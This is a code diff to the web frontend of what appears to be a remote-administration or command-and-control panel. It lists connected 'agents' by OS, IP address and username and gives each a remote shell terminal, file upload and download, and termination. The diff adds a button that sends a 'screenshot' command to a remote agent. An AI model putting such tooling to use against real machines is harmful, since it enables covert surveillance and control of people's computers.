@@ -215,29 +215,32 @@ function updateCommandCenter() {
 }
 
 function createAgentTab(agentId, agentInfo) {
-                    const tabHTML = `
+    const tabHTML = `
         <div id="agent-tab-${agentId}" class="agent-tab ${currentAgent === agentId ? 'active' : ''}" 
              style="display: ${currentAgent === agentId ? 'flex' : 'none'}">
-                            <div class="agent-tab-header">
-                                <div class="agent-info">
+            <div class="agent-tab-header">
+                <div class="agent-info">
                     <span class="agent-name">${agentInfo.alias || `Agent_${agentId}`}</span>
-                                    <span class="agent-details">
+                    <span class="agent-details">
                         ${agentInfo.os_type || 'Unknown'} | ${agentInfo.ip} | ${agentInfo.username}
-                                    </span>
-                                </div>
-                                <div class="agent-actions">
+                    </span>
+                </div>
+                <div class="agent-actions">
+                    <button onclick="takeScreenshot(${agentId})" title="Take Screenshot">
+                        <span class="material-icons">photo_camera</span>
+                    </button>
                     <button onclick="uploadFile(${agentId})" title="Upload File">
-                                        <span class="material-icons">upload</span>
-                                    </button>
+                        <span class="material-icons">upload</span>
+                    </button>
                     <button onclick="downloadFile(${agentId})" title="Download File">
-                                        <span class="material-icons">download</span>
-                                    </button>
+                        <span class="material-icons">download</span>
+                    </button>
                     <button onclick="terminateAgent(${agentId})" title="Terminate">
-                                        <span class="material-icons">power_settings_new</span>
-                                    </button>
-                                </div>
-                            </div>
-                            <div class="terminal-container">
+                        <span class="material-icons">power_settings_new</span>
+                    </button>
+                </div>
+            </div>
+            <div class="terminal-container">
                 <div class="terminal-progress" id="progress-${agentId}">
                     <div class="progress-bar">
                         <div class="progress-fill"></div>
@@ -246,19 +249,19 @@ function createAgentTab(agentId, agentInfo) {
                     <div class="progress-status">Transferring...</div>
                 </div>
                 <div class="terminal-output" id="terminal-output-${agentId}"></div>
-                                <div class="terminal-input-container">
-                                    <div class="terminal-input">
-                                        <span class="prompt">$</span>
-                                        <input type="text" 
-                                               class="terminal-input-field" 
+                <div class="terminal-input-container">
+                    <div class="terminal-input">
+                        <span class="prompt">$</span>
+                        <input type="text" 
+                               class="terminal-input-field" 
                                id="terminal-input-${agentId}" 
-                                               placeholder="Enter command..."
+                               placeholder="Enter command..."
                                onkeypress="handleCommand(event, ${agentId})">
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    `;
+                    </div>
+                </div>
+            </div>
+        </div>
+    `;
     return tabHTML;
 }
 
@@ -949,4 +952,35 @@ function appendToTerminal(text, type = 'output', agentId) {
     }
 
     terminal.scrollTop = terminal.scrollHeight;
+}
+
+// Add this new function for screenshot functionality
+function takeScreenshot(agentId) {
+    appendToTerminal('Taking screenshot...', 'info', agentId);
+    
+    fetch('/api/send_command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: agentId,
+            command: 'screenshot'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) {
+            appendToTerminal(data.error, 'error', agentId);
+        } else {
+            appendToTerminal(data.output, 'success', agentId);
+            // Refresh storage view if we're on the storage tab
+            if (document.querySelector('[data-tab="storage"]').classList.contains('active')) {
+                updateStorage();
+            }
+        }
+    })
+    .catch(error => {
+        appendToTerminal(`Error taking screenshot: ${error.message}`, 'error', agentId);
+    });
 } 
